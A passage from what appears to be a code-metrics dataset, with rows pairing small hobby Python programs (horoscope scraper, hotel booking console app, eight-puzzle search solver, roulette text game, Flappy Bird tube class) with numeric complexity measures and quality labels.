    def get_video_type(self):
        filename, ext = os.path.splitext(self.filepath)
        if ext in self.VIDEO_TYPE:
            return self.VIDEO_TYPE[ext]
        return self.VIDEO_TYPE[""avi""]
",2507,46,53,11,19,18,0,5.0,12,10,5,20.0,14,,30,64.91260938324326,127.43782540330756,3.571428571428572,medio,Yes,False,False,Low,id48
daily_horoscope.py,"from bs4 import BeautifulSoup
import requests

""""""
   this check_sign function checks and returns the zodiac sign
   by day and month of your birth

""""""


def check_sign():
    your_birth_day = input(""enter your birthday day number> "")
    your_birth_month = input(""cool, and the month number, please> "")
    if (int(your_birth_month) == 12 and int(your_birth_day) >= 22) or (
        int(your_birth_month) == 1 and int(your_birth_day) <= 19
    ):
        sign = ""Capricorn""
    elif (int(your_birth_month) == 1 and int(your_birth_day) >= 20) or (
        int(your_birth_month) == 2 and int(your_birth_day) <= 17
    ):
        sign = ""Aquarium""
    elif (int(your_birth_month) == 2 and int(your_birth_day) >= 18) or (
        int(your_birth_month) == 3 and int(your_birth_day) <= 19
    ):
        sign = ""Pices""
    elif (int(your_birth_month) == 3 and int(your_birth_day) >= 20) or (
        int(your_birth_month) == 4 and int(your_birth_day) <= 19
    ):
        sign = ""Aries""
    elif (int(your_birth_month) == 4 and int(your_birth_day) >= 20) or (
        int(your_birth_month) == 5 and int(your_birth_day) <= 20
    ):
        sign = ""Taurus""
    elif (int(your_birth_month) == 5 and int(your_birth_day) >= 21) or (
        int(your_birth_month) == 6 and int(your_birth_day) <= 20
    ):
        sign = ""Gemini""
    elif (int(your_birth_month) == 6 and int(your_birth_day) >= 21) or (
        int(your_birth_month) == 7 and int(your_birth_day) <= 22
    ):
        sign = ""Cancer""
    elif (int(your_birth_month) == 7 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 8 and int(your_birth_day) <= 22
    ):
        sign = ""Leo""
    elif (int(your_birth_month) == 8 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 9 and int(your_birth_day) <= 22
    ):
        sign = ""Virgo""
    elif (int(your_birth_month) == 9 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 10 and int(your_birth_day) <= 22
    ):
        sign = ""Libra""
    elif (int(your_birth_month) == 10 and int(your_birth_day) >= 23) or (
        int(your_birth_month) == 11 and int(your_birth_day) <= 21
    ):
        sign = ""Scorpio""
    elif (int(your_birth_month) == 11 and int(your_birth_day) >= 22) or (
        int(your_birth_month) == 12 and int(your_birth_day) <= 21
    ):
        sign = ""Sagittarius""

    return sign


def horoscope(zodiac_sign: int, day: str) -> str:
    url = (
        ""https://www.horoscope.com/us/horoscopes/general/""
        f""horoscope-general-daily-{day}.aspx?sign={zodiac_sign}""
    )
    soup = BeautifulSoup(requests.get(url).content, ""html.parser"")
    return soup.find(""div"", class_=""main-horoscope"").p.text


if __name__ == ""__main__"":
    print(""Daily Horoscope. \n"")
    print(
        ""enter your Zodiac sign number:\n"",
        ""1. Aries\n"",
        ""2. Taurus\n"",
        ""3. Gemini\n"",
        ""4. Cancer\n"",
        ""5. Leo\n"",
        ""6. Virgo\n"",
        ""7. Libra\n"",
        ""8. Scorpio\n"",
        ""9. Sagittarius\n"",
        ""10. Capricorn\n"",
        ""11. Aquarius\n"",
        ""12. Pisces\n"",
        ""\nor if you're not sure about you sign, type 'calculate'"",
    )
    zodiac_sign = input(""number> "")
    if zodiac_sign != ""calculate"":
        print(""choose some day:\n"", ""yesterday\n"", ""today\n"", ""tomorrow\n"")
        day = input(""enter the day> "")
        horoscope_text = horoscope(zodiac_sign, day)
        print(horoscope_text)
    else:
        print(""\nOk, don't worry. Soon you'll get it just pass this tiny quiz"")
        print(""\nCongratulations! you are defenetly"", check_sign())
",3581,47,88,9,0,0,4,2.0,50,86,6,172.0,143,,258,1039.3713761636366,1862.5454782792376,3.608391608391608,bajo,No,True,False,High,id49
Hotel-Management.py,"
def menu():

    options = {
        1 : {
            ""title"" : ""Add new customer details"", 
            ""method"": lambda : add()
            },

        2 : {
            ""title"" : ""Modify already existing customer details"", 
            ""method"": lambda : modify()
            },

        3 : {
            ""title"" : ""Search customer details"", 
            ""method"": lambda : search()
            },

        4 : {
            ""title"" : ""View all customer details"", 
            ""method"": lambda : view()
            },

        5 : {
            ""title"" : ""Delete customer details"", 
            ""method"": lambda : remove()
            },

        6 : {
            ""title"" : ""Exit the program"", 
            ""method"": lambda : exit()
            }
    }

    print(f""\n\n{' '*25}Welcome to Hotel Database Management Software\n\n"")

    for num, option in options.items():
        print(f""{num}: {option.get('title')}"")
    print()

    options.get( int(input(""Enter your choice(1-6): "")) ).get(""method"")()


def add():

    Name1 = input(""\nEnter your first name: \n"")
    Name2 = input(""\nEnter your last name: \n"")
    Phone_Num = input(""\nEnter your phone number(without +91): \n"")

    print(""These are the rooms that are currently available"")
    print(""1-Normal (500/Day)"")
    print(""2-Deluxe (1000/Day)"")
    print(""3-Super Deluxe (1500/Day)"")
    print(""4-Premium Deluxe (2000/Day)"")

    Room_Type = int(input(""\nWhich type you want(1-4): \n""))

    match Room_Type:
        case 1:
            x = 500
            Room_Type = ""Normal""
        case 2:
            x = 1000
            Room_Type = ""Deluxe""
        case 3:
            x = 1500
            Room_Type = ""Super Deluxe""
        case 4:
            x = 2000
            Room_Type = ""Premium""

    Days = int(input(""How many days you will stay: ""))
    Money = x * Days
    Money = str(Money)
    print("""")

    print(""You have to pay "", (Money))
    print("""")

    Payment = input(""Mode of payment(Card/Cash/Online): "").capitalize()
    if Payment == ""Card"":
        print(""Payment with card"")
    elif Payment == ""Cash"":
        print(""Payment with cash"")
    elif Payment == ""Online"":
        print(""Online payment"")
    print("""")

    with open(""Management.txt"", ""r"") as File:
        string = File.read()
        string = string.replace(""'"", '""')
        dictionary = json.loads(string)

    if len(dictionary.get(""Room"")) == 0:
        Room_num = ""501""
    else:
        listt = dictionary.get(""Room"")
        tempp = len(listt) - 1
        temppp = int(listt[tempp])
        Room_num = 1 + temppp
        Room_num = str(Room_num)

    print(""You have been assigned Room Number"", Room_num)
    print(f""name : {Name1} {Name2}"")
    print(f""phone number : +91{Phone_Num}"")
    print(f""Room type : {Room_Type}"")
    print(f""Stay (day) : {Days}"")

    dictionary[""First_Name""].append(Name1)
    dictionary[""Last_Name""].append(Name2)
    dictionary[""Phone_num""].append(Phone_Num)
    dictionary[""Room_Type""].append(Room_Type)
    dictionary[""Days""].append(Days)
    dictionary[""Price""].append(Money)
    dictionary[""Room""].append(Room_num)

    with open(""Management.txt"", ""w"", encoding=""utf-8"") as File:
        File.write(str(dictionary))

    print(""\nYour data has been successfully added to our database."")

    exit_menu()


import os
import json

filecheck = os.path.isfile(""Management.txt"")
if not filecheck:
    with open(""Management.txt"", ""a"", encoding=""utf-8"") as File:
        temp1 = {
            ""First_Name"": [],
            ""Last_Name"": [],
            ""Phone_num"": [],
            ""Room_Type"": [],
            ""Days"": [],
            ""Price"": [],
            ""Room"": [],
        }
        File.write(str(temp1))


def modify():

    with open(""Management.txt"", ""r"") as File:
        string = File.read()
        string = string.replace(""'"", '""')
        dictionary = json.loads(string)

    dict_num = dictionary.get(""Room"")
    dict_len = len(dict_num)
    if dict_len == 0:
        print(""\nThere is no data in our database\n"")
        menu()
    else:
        Room = input(""\nEnter your Room Number: "")

        listt = dictionary[""Room""]
        index = int(listt.index(Room))

        print(""\n1-Change your first name"")
        print(""2-Change your last name"")
        print(""3-Change your phone number"")

        choice = int(input(""\nEnter your choice: ""))
        print()

        with open(""Management.txt"", ""w"", encoding=""utf-8"") as File:
            
            match choice:
                case 1:
                    category = ""First_Name""
                case 2:
                    category = ""Last_Name""
                case 3:
                    category = ""Phone_num""

            user_input = input(f""Enter New {category.replace('_', ' ')}"")
            listt1 = dictionary[category]
            listt1[index] = user_input
            dictionary[category] = None
            dictionary[category] = listt1

            File.write(str(dictionary))

        print(""\nYour data has been successfully updated"")
        exit_menu()


def search():

    with open(""Management.txt"") as File:
        dictionary = json.loads(File.read().replace(""'"", '""'))

    dict_num = dictionary.get(""Room"")
    dict_len = len(dict_num)

    if dict_len == 0:
        print(""\nThere is no data in our database\n"")
        menu()
    else:
        Room = input(""\nEnter your Room Number: "")

        listt_num = dictionary.get(""Room"")
        index = int(listt_num.index(Room))

        listt_fname = dictionary.get(""First_Name"")
        listt_lname = dictionary.get(""Last_Name"")
        listt_phone = dictionary.get(""Phone_num"")
        listt_type = dictionary.get(""Room_Type"")
        listt_days = dictionary.get(""Days"")
        listt_price = dictionary.get(""Price"")

        print(f""\nFirst Name: {listt_fname[index]}"")
        print(f""Last Name: {listt_lname[index]}"")
        print(f""Phone number: {listt_phone[index]}"")
        print(f""Room Type: {listt_type[index]}"")
        print(f""Days staying: {listt_days[index]}"")
        print(f""Money paid: {listt_price[index]}"")
        print(f""Room Number: {listt_num[index]}"")

        exit_menu()


def remove():
    with open(""Management.txt"") as File:
        dictionary = json.loads(File.read().replace(""'"", '""'))

    dict_num = dictionary.get(""Room"")
    dict_len = len(dict_num)
    if dict_len == 0:
        print(""\nThere is no data in our database\n"")
        menu()
    else:
        Room = input(""\nEnter your Room Number: "")

        listt = dictionary[""Room""]
        index = int(listt.index(Room))

        listt_fname = dictionary.get(""First_Name"")
        listt_lname = dictionary.get(""Last_Name"")
        listt_phone = dictionary.get(""Phone_num"")
        listt_type = dictionary.get(""Room_Type"")
        listt_days = dictionary.get(""Days"")
        listt_price = dictionary.get(""Price"")
        listt_num = dictionary.get(""Room"")

        del listt_fname[index]
        del listt_lname[index]
        del listt_phone[index]
        del listt_type[index]
        del listt_days[index]
        del listt_price[index]
        del listt_num[index]

        dictionary[""First_Name""] = None
        dictionary[""First_Name""] = listt_fname

        dictionary[""Last_Name""] = None
        dictionary[""Last_Name""] = listt_lname

        dictionary[""Phone_num""] = None
        dictionary[""Phone_num""] = listt_phone

        dictionary[""Room_Type""] = None
        dictionary[""Room_Type""] = listt_type

        dictionary[""Days""] = None
        dictionary[""Days""] = listt_days

        dictionary[""Price""] = None
        dictionary[""Price""] = listt_price

        dictionary[""Room""] = None
        dictionary[""Room""] = listt_num

        with open(""Management.txt"", ""w"", encoding=""utf-8"") as file1:
            file1.write(str(dictionary))

        print(""Details has been removed successfully"")

        exit_menu()


def view():

    with open(""Management.txt"") as File:
        dictionary = json.loads(File.read().replace(""'"", '""'))

    dict_num = dictionary.get(""Room"")
    dict_len = len(dict_num)
    if dict_len == 0:
        print(""\nThere is no data in our database\n"")
        menu()

    else:
        listt = dictionary[""Room""]
        a = len(listt)

        index = 0
        while index != a:
            listt_fname = dictionary.get(""First_Name"")
            listt_lname = dictionary.get(""Last_Name"")
            listt_phone = dictionary.get(""Phone_num"")
            listt_type = dictionary.get(""Room_Type"")
            listt_days = dictionary.get(""Days"")
            listt_price = dictionary.get(""Price"")
            listt_num = dictionary.get(""Room"")

            print("""")
            print(""First Name:"", listt_fname[index])
            print(""Last Name:"", listt_lname[index])
            print(""Phone number:"", listt_phone[index])
            print(""Room Type:"", listt_type[index])
            print(""Days staying:"", listt_days[index])
            print(""Money paid:"", listt_price[index])
            print(""Room Number:"", listt_num[index])
            print("""")

            index = index + 1

        exit_menu()


def exit():
    print("""")
    print(""                             Thanks for visiting"")
    print(""                                 Goodbye"")


def exit_menu():
    print("""")
    print(""Do you want to exit the program or return to main menu"")
    print(""1-Main Menu"")
    print(""2-Exit"")
    print("""")

    user_input = int(input(""Enter your choice: ""))
    if user_input == 2:
        exit()
    elif user_input == 1:
        menu()


try:
    menu()
except KeyboardInterrupt as exit:
    print(""\nexiting...!"")

# menu()
",9613,236,267,83,1,1,0,8.0,27,17,6,33.0,28,,50,150.11571282193984,254.373142062517,3.5357142857142856,bajo,No,True,False,,id50
eight_puzzle.py,"# import sys
from collections import deque
from copy import deepcopy
from queue import PriorityQueue

# import time
# from collections import Counter


class Node:
    def __init__(self, state, depth=0, moves=None, optimizer=0):
        """"""
        Parameters:
            state: State of Puzzle
            depth: Depth of State in Space Search Tree
            moves: Moves List to reach this state from initial state
            optimizer: Used for UCS Only
                0 - Manhattan Distance
                1 - Hamming Distance
                2 - Combination of 0 and 1

        Returns: Node Object
        """"""
        self.state = state
        self.size = len(state)
        self.depth = depth
        self.optimizer = optimizer
        if moves is None:
            self.moves = list()
        else:
            self.moves = moves

    def getAvailableActions(self):
        """"""
        Parameters: Current State
        Returns: Available Actions for Current State
        0 - Left    1 - Right   2 - Top     3 - Bottom
        Restrictions: state is self.size x self.size Array
        """"""
        action = list()
        for i in range(self.size):
            for j in range(self.size):
                if self.state[i][j] == 0:
                    if i > 0:
                        action.append(2)
                    if j > 0:
                        action.append(0)
                    if i < self.size - 1:
                        action.append(3)
                    if j < self.size - 1:
                        action.append(1)
                    return action
        return action

    def getResultFromAction(self, action):
        """"""
        Parameters: Current State , Action
        Returns: Node with New State
        Restrictions: Action will always be valid and state is self.size x self.size Array
        """"""
        newstate = deepcopy(self.state)
        newMoves = deepcopy(self.moves)
        for i in range(self.size):
            for j in range(self.size):
                if newstate[i][j] == 0:
                    if action == 2:
                        newstate[i][j], newstate[i - 1][j] = (
                            newstate[i - 1][j],
                            newstate[i][j],
                        )
                        newMoves.append(2)
                        return Node(
                            newstate,
                            depth=self.depth + 1,
                            moves=newMoves,
                            optimizer=self.optimizer,
                        )
                    if action == 3:
                        newstate[i][j], newstate[i + 1][j] = (
                            newstate[i + 1][j],
                            newstate[i][j],
                        )
                        newMoves.append(3)
                        return Node(
                            newstate,
                            depth=self.depth + 1,
                            moves=newMoves,
                            optimizer=self.optimizer,
                        )
                    if action == 0:
                        newstate[i][j], newstate[i][j - 1] = (
                            newstate[i][j - 1],
                            newstate[i][j],
                        )
                        newMoves.append(0)
                        return Node(
                            newstate,
                            depth=self.depth + 1,
                            moves=newMoves,
                            optimizer=self.optimizer,
                        )
                    if action == 1:
                        newstate[i][j], newstate[i][j + 1] = (
                            newstate[i][j + 1],
                            newstate[i][j],
                        )
                        newMoves.append(1)
                        return Node(
                            newstate,
                            depth=self.depth + 1,
                            moves=newMoves,
                            optimizer=self.optimizer,
                        )
        return None

    def isGoalState(self):
        """"""
        Parameters: State
        Returns: True if Goal State, otherwise False
        Restrictions: State is self.size x self.size Array
        """"""
        for i in range(self.size):
            for j in range(self.size):
                if i == j and j == self.size - 1:
                    continue
                if self.state[i][j] != (i) * self.size + (j + 1):
                    return False
        return True

    def getManhattanDistance(self):
        """"""
        Parameters: State
        Returns: Manhattan Distance between Current State and Goal State
        Restrictions: State must be a self.size x self.size Array
        """"""
        ans = 0
        for i in range(self.size):
            for j in range(self.size):
                if self.state[i][j] != 0:
                    ans = (
                        ans
                        + abs((self.state[i][j] - 1) % self.size - j)
                        + abs((self.state[i][j] - 1) // self.size - i)
                    )

        return ans

    def getHammingDistance(self):
        ans = 0
        for i in range(self.size):
            for j in range(self.size):
                if self.state[i][j] != 0 and self.state[i][j] != i * 3 + (j + 1):
                    ans = ans + 1
        return ans

    def __hash__(self):
        flatState = [j for sub in self.state for j in sub]
        flatState = tuple(flatState)
        return hash(flatState)

    def __gt__(self, other):
        if self.optimizer == 0:
            if self.getManhattanDistance() > other.getManhattanDistance():
                return True
            else:
                return False
        elif self.optimizer == 1:
            if self.getHammingDistance() > other.getHammingDistance():
                return True
            else:
                return False
        elif self.optimizer == 2:
            if (
                self.getHammingDistance() + self.getManhattanDistance()
                > other.getHammingDistance() + self.getManhattanDistance()
            ):
                return True
            else:
                return False
        return True

    def __ge__(self, other):
        if self.optimizer == 0:
            if self.getManhattanDistance() >= other.getManhattanDistance():
                return True
            else:
                return False
        elif self.optimizer == 1:
            if self.getHammingDistance() >= other.getHammingDistance():
                return True
            else:
                return False
        elif self.optimizer == 2:
            if (
                self.getHammingDistance() + self.getManhattanDistance()
                >= other.getHammingDistance() + self.getManhattanDistance()
            ):
                return True
            else:
                return False
        return True

    def __lt__(self, other):
        if self.optimizer == 0:
            if self.getManhattanDistance() < other.getManhattanDistance():
                return True
            else:
                return False
        elif self.optimizer == 1:
            if self.getHammingDistance() < other.getHammingDistance():
                return True
            else:
                return False
        elif self.optimizer == 2:
            if (
                self.getHammingDistance() + self.getManhattanDistance()
                < other.getHammingDistance() + self.getManhattanDistance()
            ):
                return True
            else:
                return False
        return True

    def __le__(self, other):
        if self.optimizer == 0:
            if self.getManhattanDistance() <= other.getManhattanDistance():
                return True
            else:
                return False
        elif self.optimizer == 1:
            if self.getHammingDistance() <= other.getHammingDistance():
                return True
            else:
                return False
        elif self.optimizer == 2:
            if (
                self.getHammingDistance() + self.getManhattanDistance()
                <= other.getHammingDistance() + self.getManhattanDistance()
            ):
                return True
            else:
                return False
        return True

    def __eq__(self, other):
        if self.optimizer == 0:
            if self.getManhattanDistance() == other.getManhattanDistance():
                return True
            else:
                return False
        elif self.optimizer == 1:
            if self.getHammingDistance() == other.getHammingDistance():
                return True
            else:
                return False
        elif self.optimizer == 2:
            if (
                self.getHammingDistance() + self.getManhattanDistance()
                == other.getHammingDistance() + self.getManhattanDistance()
            ):
                return True
            else:
                return False
        return True


class Solver:
    def __init__(self, state):
        self.state = state

    def isSolvable(self):
        """"""
        Parameters: State
        Returns: True if state is solvable, otherwise False
        """"""
        flatState = [j for sub in self.state for j in sub]
        inversions = 0
        for i in range(len(flatState) - 1):
            for j in range(i + 1, len(flatState)):
                if (
                    flatState[i] != 0
                    and flatState[j] != 0
                    and flatState[i] > flatState[j]
                ):
                    inversions = inversions + 1
        return inversions % 2 == 0

    def breadth_first_search(self):
        """"""
        Parameters: State
        Returns: List of Moves to solve the state, otherwise None if unsolvable
        """"""
        if self.isSolvable() == False:
            return (None, None)

        closed = list()
        q = deque()
        q.append(Node(state=self.state, depth=0))
        while q:
            node = q.popleft()

            if node.isGoalState():
                return (node.moves, len(closed))
            if node.state not in closed:
                closed.append(node.state)
                for action in node.getAvailableActions():
                    q.append(node.getResultFromAction(action))

        return (None, None)

    def depth_first_search(self):
        """"""
        Parameters: State
        Returns: List of Moves to solve the state, otherwise None if unsolvable
        """"""
        if self.isSolvable() == False:
            return (None, None)
        closed = list()
        q = list()
        q.append(Node(state=self.state, depth=0))
        while q:
            node = q.pop()
            if node.isGoalState():
                return (node.moves, len(closed))
            if node.state not in closed:
                closed.append(node.state)
                for action in node.getAvailableActions():
                    q.append(node.getResultFromAction(action))

        return (None, None)

    def uniform_cost_search(self, optimizer=0):
        """"""
        Parameters: State, Optimizer
        Returns: List of Moves to solve the state, otherwise None if unsolvable
        """"""
        if self.isSolvable() == False:
            return (None, None)
        closed = list()
        q = PriorityQueue()
        q.put(Node(state=self.state, depth=0, optimizer=optimizer))
        while q:
            node = q.get()
            if node.isGoalState():
                return (node.moves, len(closed))
            if node.state not in closed:
                closed.append(node.state)
                for action in node.getAvailableActions():
                    q.put(node.getResultFromAction(action))

        return (None, None)

    def a_star(self):
        """"""
        Parameters: State, Optimizer
        Returns: List of Moves to solve the state, otherwise None if unsolvable
        """"""
        if self.isSolvable() == False:
            return (None, None)
        closed = dict()
        q = PriorityQueue()
        node = Node(state=self.state, depth=0)
        q.put((node.getManhattanDistance(), node))
        while q:
            dist, node = q.get()
            closed[node] = dist
            if node.isGoalState():
                return (node.moves, len(closed))
            for action in node.getAvailableActions():
                nextNode = node.getResultFromAction(action)
                nextDist = nextNode.getManhattanDistance()
                if (
                    nextNode not in closed
                    or nextNode.depth + nextDist < closed[nextNode]
                ):
                    q.put((nextNode.depth + nextDist, nextNode))
        return (None, None)


def toWord(action):
    """"""
    Parameters: List of moves
    Returns: Returns List of moves in Word
    """"""
    if action == 0:
        return ""Left""
    if action == 1:
        return ""Right""
    if action == 2:
        return ""Top""
    if action == 3:
        return ""Bottom""


# initialState =  [[1,8,4],[3,6,0],[2,7,5]]
# # [[1,2,3],[4,5,6],[0,7,8]]
# # [[6,8,5],[2,3,4],[1,0,7]]
# # [[13,11,10,7],[6,0,15,2],[14,1,8,12],[5,3,4,9]]
# # [[8,2,3],[4,6,5],[7,8,0]]
# solver = Solver(initialState)
# print(""Initial State:- {}"".format(initialState))
# n = Node(state=initialState,depth=0)

# print('-------------------------A Star--------------------------------')
# startTime = time.time()
# moves,nodesGenerated = solver.a_star()
# endTime = time.time()
# if moves is None:
#     print(""Given State is Unsolvable!"")
# else:
#     wordMoves = list(map(toWord,moves))
#     print(""Nodes Generated:- {}"".format(nodesGenerated))
#     print(""No. of moves:- {}"".format(len(moves)))
#     print(""Required Moves:- {}"".format(wordMoves))
#     print(""Execution Time:- {:.2f} ms"".format((endTime-startTime)*1000))


# print('-------------------------UCS--------------------------------')
# startTime = time.time()
# moves,nodesGenerated = solver.uniform_cost_search()
# endTime = time.time()
# if moves is None:
#     print(""Given State is Unsolvable!"")
# else:
#     wordMoves = list(map(toWord,moves))
#     print(""Nodes Generated:- {}"".format(nodesGenerated))
#     print(""No. of moves:- {}"".format(len(moves)))
#     print(""Required Moves:- {}"".format(wordMoves))
#     print(""Execution Time:- {:.2f} ms"".format((endTime-startTime)*1000))


# print('-------------------------BFS--------------------------------')
# startTime = time.time()
# moves,nodesGenerated = (solver.breadth_first_search())
# endTime = time.time()
# if moves is None:
#     print(""Given State is Unsolvable!"")
# else:
#     wordMoves = list(map(toWord,moves))
#     print(""Nodes Generated:- {}"".format(nodesGenerated))
#     print(""No. of moves:- {}"".format(len(moves)))
#     print(""Required Moves:- {}"".format(wordMoves))
#     print(""Execution Time:- {:.2f} ms"".format((endTime-startTime)*1000))


# print('-------------------------DFS--------------------------------')
# startTime = time.time()
# moves,nodesGenerated = (solver.depth_first_search())
# endTime = time.time()
# if moves is None:
#     print(""Given State is Unsolvable!"")
# else:
#     wordMoves = list(map(toWord,moves))
#     print(""Nodes Generated:- {}"".format(nodesGenerated))
#     print(""No. of moves:- {}"".format(len(moves)))
#     print(""Required Moves:- {}"".format(wordMoves))
#     print(""Execution Time:- {:.2f} ms"".format((endTime-startTime)*1000))
",15518,256,303,39,59,59,56,19.0,123,114,15,229.0,170,,343,1318.1998180775372,2583.263840957095,10.102941176470589,bajo,Yes,False,False,Very High,id51
check_internet_con.py,"from sys import argv

try:
    # For Python 3.0 and later
    from urllib.error import URLError
    from urllib.request import urlopen
except ImportError:
    # Fall back to Python 2's urllib2
    from urllib2 import URLError, urlopen


def checkInternetConnectivity():
    try:
        url = argv[1]
        print(url)
        protocols = [""https://"", ""http://""]
        if not any(x for x in protocols if x in url):
            url = ""https://"" + url
        print(""URL:"" + url)
    except BaseException:
        url = ""https://google.com""
    try:
        urlopen(url, timeout=2)
        print(f'Connection to ""{url}"" is working')

    except URLError as E:
        print(""Connection error:%s"" % E.reason)


checkInternetConnectivity()
",739,22,22,6,2,2,0,,6,5,4,9.0,7,,14,27.651484454403228,48.43204266092217,2.571428571428572,medio,No,False,False,Low,id52
russian_roulette.py,""""""" author: Ataba29
    the code is just a russian roulette game against
    the computer
""""""
from random import randrange
import time


def main():

    # create the gun and set the bullet
    numOfRounds = 6
    gun = [0, 0, 0, 0, 0, 0]
    bullet = randrange(0, 6)
    gun[bullet] = 1
    player = False  # is player dead
    pc = False  # is pc dead

    # menu
    print(""/********************************/"")
    print(""    Welcome to russian roulette"")
    print(""/********************************/"")
    time.sleep(2)
    print(""you are going to play against the pc"")
    time.sleep(2)
    print(""there is one gun and one bullet"")
    time.sleep(2)
    print(""all you have to do is pick who starts first"")
    time.sleep(2)

    # take input from the user
    answer = input(
        ""please press 'm' if you want to start first or 'p' if you want the pc to start first: ""
    )

    # check input
    while answer != ""m"" and answer != ""p"":
        answer = input(""please enter again ('m' or 'p'): "")

    # set turn
    if answer == 'm':
        turn = ""player""
    else:
        turn = ""pc""

    # game starts
    while numOfRounds != 0 and (pc == False and player == False):
        print(f""\nRound number {numOfRounds}/6"")
        time.sleep(1)
        print(""the gun is being loaded"")
        time.sleep(3)
        print(""the gun is placed on "" + (""your head"" if turn ==
              ""player"" else ""the cpu of the pc""))
        time.sleep(3)
        print(""and..."")
        time.sleep(1)
        print(""..."")
        time.sleep(2)
        print(""..."")
        time.sleep(2)
        print(""..."")
        time.sleep(2)

        # get the bullet in the chamber
        shot = gun.pop(numOfRounds - 1)

        if shot:
            print(""THE GUN WENT OFF!!!"")
            print(""YOU DIED"" if turn == ""player"" else ""THE PC DIED"")
            if turn == ""player"":  # set up who died
                player = True
            else:
                pc = True
        else:
            print(""nothing happened phew!"")
            if turn == ""player"":  # flip the turn
                turn = ""pc""
            else:
                turn = ""player""

        time.sleep(2)
        numOfRounds -= 1

    time.sleep(1)
    print("""")
    if player:
        print(""sorry man you died better luck next time"")
        print(""don't forget to send a pic from heaven :)"")
    else:
        print(""good job man you survived"")
        print(""you just got really lucky"")
    print(""anyways hope you had fun because i sure did"")


main()
",2526,68,70,14,11,7,4,1.0,13,16,5,32.0,17,,48,81.0965087756926,214.05271769459029,4.705882352941177,medio,No,True,False,Medium,id53
diamond.py,"def draw_diamond(n):
    if n % 2 != 0:
        k = 1
        while k <= n:
            print("" "" * int((n - k) / 2) + ""*"" * k + "" "" * int((n - k) / 2))
            k += 2

        j = 1
        while (n - 2 * j) >= 1:
            print("" "" * j + ""*"" * (n - 2 * j) + "" "" * (j))
            j += 1
    else:
        print(""Not an odd number. Can't draw a diamond :("")


n = int(input(""Enter an odd number: ""))
draw_diamond(n)
",425,14,14,3,0,0,0,1.0,4,24,8,48.0,25,,72,140.0964047443681,363.1963765938086,7.68,medio,No,True,False,Medium-High,id54
ThirdAI.py,"from thirdai import licensing, neural_db as ndb


class NeuralDBClient:
    def __init__(self):
        # Activating ThirdAI Key
        licensing.activate(""ADD-YOUR-THIRDAI-ACTIVATION-KEY"")

        # Creating NeuralBD variable to access Neural Database
        self.db = ndb.NeuralDB(user_id=""my_user"")

    def train(self, file_paths):
        # Retrieving path of file
        insertable_docs = []
        pdf_files = file_paths

        # Appending PDF file to the Database stack
        pdf_doc = ndb.PDF(pdf_files)
        insertable_docs.append(pdf_doc)

        # Inserting/Uploading PDF file to Neural database for training
        self.db.insert(insertable_docs, train=True)

    def query(self, question):
        # Searching of required query in neural database
        search_results = self.db.search(
            query=question,
            top_k=2,
            on_error=lambda error_msg: print(f""Error! {error_msg}""))

        output = """"
        for result in search_results:
            output += result.text + ""\n\n""

        return output

",1060,18,20,10,6,6,0,3.0,6,2,1,4.0,4,,6,8.0,13.931568569324174,0.5,alto,Yes,False,False,Low,id55
Tubes.py,"from random import randint
from threading import Thread

from Background import Background
from Bird import Bird
from PIL.Image import open as openImage
from PIL.ImageTk import PhotoImage


class Tubes(Thread):
    """"""
    Classe para criar tubos
    """"""

    __distance = 0
    __move = 10
    __pastTubes = []

    def __init__(
        self,
        background,
        bird,
        score_function=None,
        *screen_geometry,
        fp=(""tube.png"", ""tube_mourth""),
        animation_speed=50
    ):

        # Verifica os parÃ¢metros passados e lanÃ§a um erro caso algo esteja incorreto
        if not isinstance(background, Background):
            raise TypeError(
                ""The background argument must be an instance of Background.""
            )
        if not len(fp) == 2:
            raise TypeError(
                ""The parameter fp should be a sequence containing the path of the images of the tube body and the tube mouth.""
            )
        if not isinstance(bird, Bird):
            raise TypeError(""The birdargument must be an instance of Bird."")
        if not callable(score_function):
            raise TypeError(""The score_function argument must be a callable object."")

        Thread.__init__(self)

        # InstÃ¢ncia os parÃ¢metros
        self.__background = background
        self.image_path = fp
        self.__animation_speed = animation_speed
        self.__score_method = score_function

        # Recebe a largura e altura do background
        self.__width = screen_geometry[0]
        self.__height = screen_geometry[1]

        # Recebe o tamanho do pÃ¡ssaro
        self.__bird_w = bird.width
        self.__bird_h = bird.height

        # Calcula a largura e altura da imagem
        self.__imageWidth = (self.__width // 100) * 10
        self.__imageHeight = (self.__height // 100) * 5

        # Cria uma lista para guardar imagens dos tubos
        try:
            self.deleteAll()
        except BaseException:
            self.__background.tubeImages = []

        # Cria uma lista somente para guardar as imagens futuras dos corpos dos tubos gerados
        self.__background.tubeImages.append([])

        # Carrega a imagem da boca do tubo
        self.__background.tubeImages.append(
            self.getPhotoImage(
                image_path=self.image_path[1],
                width=self.__imageWidth,
                height=self.__imageHeight,
                closeAfter=True,
            )[0]
        )

        # Carrega imagem do corpo do tubo
        self.__background.tubeImages.append(
            self.getPhotoImage(
                image_path=self.image_path[0],
                width=self.__imageWidth,
                height=self.__imageHeight,
            )[1]
        )

        # Calcula a distÃ¢ncia mÃ­nima inicial entre os tubos
        self.__minDistance = int(self.__imageWidth * 4.5)

        self.__stop = False
        self.__tubes = []

    def createNewTubes(self):
        """"""
        MÃ©todo para criar 2 novos tubos (baixo e cima) numa mesma posiÃ§Ã£o X
        """"""

        # Cria uma lista para armazenar as partes do corpo do tubo de cima
        tube1 = []

        # Define a posiÃ§Ã£o X que o tubo de cima aparecerÃ¡ inicialmente no background
        width = self.__width + (self.__imageWidth)

        # Define uma posiÃ§Ã£o Y para o tubo aleatÃ³riamente respeitando algumas regras que sÃ£o:
        # EspaÃ§o para o pÃ¡ssaro passar e espaÃ§o para adicionar o tubo de baixo.

        height = randint(
            self.__imageHeight // 2,
            self.__height - (self.__bird_h * 2) - self.__imageHeight,
        )

        # Cria e adiciona Ã  lista do corpo do tubo de cima, a boca do tubo
        tube1.append(
            self.__background.create_image(
                width, height, image=self.__background.tubeImages[1]
            )
        )

        # Cria uma nova imagem na lista de imagens com a altura sendo igual a posiÃ§Ã£o Y do tubo de cima
        self.__background.tubeImages[0].append(
            [
                self.getPhotoImage(
                    image=self.__background.tubeImages[2],
                    width=self.__imageWidth,
                    height=height,
                )[0],
            ]
        )

        # Define a posiÃ§Ã£o Y do corpo do tubo de cima
        y = (height // 2) + 1 - (self.__imageHeight // 2)

        # Cria e adiciona Ã  lista do corpo do tubo de cima, o corpo do tubo
        tube1.append(
            self.__background.create_image(
                width, y, image=self.__background.tubeImages[0][-1][0]
            )
        )

